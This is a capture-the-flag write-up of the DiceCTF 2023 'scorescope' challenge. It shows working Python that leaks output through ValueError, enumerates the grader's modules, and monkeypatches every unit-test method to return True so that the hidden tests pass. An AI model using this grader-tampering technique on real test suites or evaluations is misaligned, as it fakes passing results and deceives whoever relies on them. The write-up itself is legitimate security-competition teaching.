---
title: scorescope - DiceCTF 2023 
date: 2023-02-07 23:14:49
author: sk4d
author_url: https://twitter.com/RahulSundar8
categories:
  - Web
tags:
  - DiceCTF2023
---

**tl;dr**
 - read output using ValueError
 - sys.modules to print all the app modules
 - go through the module classes and find the test case functions and re-write them to always return true 

<!--more-->

**Challenge Points**: 156
**No. of solves**: 55
**Solved by**: [sk4d](https://twitter.com/RahulSundar8)

## Description

I'm really struggling in this class. Care to give me a hand?


## intro

I played DiceCTF 2023 last weekend with my team **bi0s**. There a were a lot of awesome web challenges. I have worked on some of the web challenges and this is the write-up for the challenge scorescope

## Initial analysis

We are allowed to upload a python file and the application will run several test cases on the file and if the test cases are successful it will be reflected on the page with a green colour. At first i thought this challenge was kind of a pyjail challenge where we have to bypass certain restrcitions to get command execution but later figured out it was not the case when i saw the functions were frozen and the hidden test which was impossible to pass

## Exploitation

> ValueError: Raised when an operation or function receives an argument that has the right type but an inappropriate value,

Since the application only tells us if our test case is successful or not we were not able to directly see the results, we can bypass this by using the ValueError Exception call as it prints whatever we pass to it as an Exception

```python
import sys
raise ValueError(str(print(7*7)))
```
i had no idea what we were supposed to do in this challenge for a while and i spend some time trying some pyjail exploits and trying to get some juicy information and i tried the sys.modules which gave us all the loaded libraries

```python
import sys
raise ValueError(str(sys.modules))
```

```text
'util': <module 'util' from '/app/util.py'>
 'test_1_add': <module 'test_1_add' from '/app/tests/test_1_add.py'>
 'test_2_longest': <module 'test_2_longest' from '/app/tests/test_2_longest.py'>
 'test_3_common': <module 'test_3_common' from '/app/tests/test_3_common.py'>
 'test_4_favorite': <module 'test_4_favorite' from '/app/tests/test_4_favorite.py'>
 'test_5_factor': <module 'test_5_factor' from '/app/tests/test_5_factor.py'>
 '_hashlib': <module '_hashlib' from '/usr/local/lib/python3.11/lib-dynload/_hashlib.cpython-311-x86_64-linux-gnu.so'>
 '_blake2': <module '_blake2' from '/usr/local/lib/python3.11/lib-dynload/_blake2.cpython-311-x86_64-linux-gnu.so'>
 'hashlib': <module 'hashlib' from '/usr/local/lib/python3.11/hashlib.py'>
 'test_6_preimage': <module 'test_6_preimage' from '/app/tests/test_6_preimage.py'>
 'test_7_magic': <module 'test_7_magic' from '/app/tests/test_7_magic.py'>
 'test_8_hidden': <module 'test_8_hidden' from '/app/tests/test_8_hidden.py'>
```
these modules caught my eyes and i tried importing them in the payload and went through all the functions and properties of these modules

```python
import test_8_hidden
raise ValueError(str(dir(test_8_hidden)))
```
we saw that all these modules has a class like TestAdd, TestHidden, TestMagic ..etc which had the functions which was called to test the test cases (noise).

```python
def add(a, b):
    import sys
    import util
    import test_1_add
    import test_2_longest
    import test_3_common
    import test_4_favorite
    import test_5_factor
    import test_6_preimage
    import test_7_magic
    import test_8_hidden
    import submission
    
    x = test_8_hidden.TestHidden()
    x.__class__.test_hidden = lambda s: True
    y = test_1_add.TestAdd()
    y.__class__.test_add_negative = lambda s: True
    y.__class__.test_add_positive = lambda s: True
    y.__class__.test_add_mixed = lambda s: True
    test_7_magic.TestMagic.test_magic_a = lambda s: True
    test_7_magic.TestMagic.test_magic_b = lambda s: True
    test_7_magic.TestMagic.test_magic_c = lambda s: True
    test_6_preimage.TestPreimage.test_preimage_a = lambda s: True
    test_6_preimage.TestPreimage.test_preimage_b = lambda s: True
    test_5_factor.TestFactor.test_factor_bigger = lambda s: True
    test_5_factor.TestFactor.test_factor_large = lambda s: True
    test_5_factor.TestFactor.test_factor_small = lambda s: True
    test_4_favorite.TestFavorite.test_favorite = lambda s: True
    test_3_common.TestCommon.test_common_nonconsecutive = lambda s: True
    test_3_common.TestCommon.test_common_single = lambda s: True
    test_3_common.TestCommon.test_common_consecutive = lambda s: True
    test_3_common.TestCommon.test_common_empty = lambda s: True
    test_3_common.TestCommon.test_common_many = lambda s: True
    test_2_longest.TestLongest.test_longest_multiple_tie = lambda s: True
    test_2_longest.TestLongest.test_longest_multiple = lambda s: True
    test_2_longest.TestLongest.test_longest_single = lambda s: True
    return a+b
```
This was our final payload for the scorescope challenge , uploading this template.py file will turns all the test cases true and the application gives us the flag. You can ignore the `__class__` in our payload because it only points to the TestHidden class itself and you can just do which will also make the hidden test case true
```python
test_8_hidden.TestHidden.hidden_test = lambda s: True
```

## Conclusion

Thanks to the DiceCTF 2023 organizers for the amazing web challenges as always :)
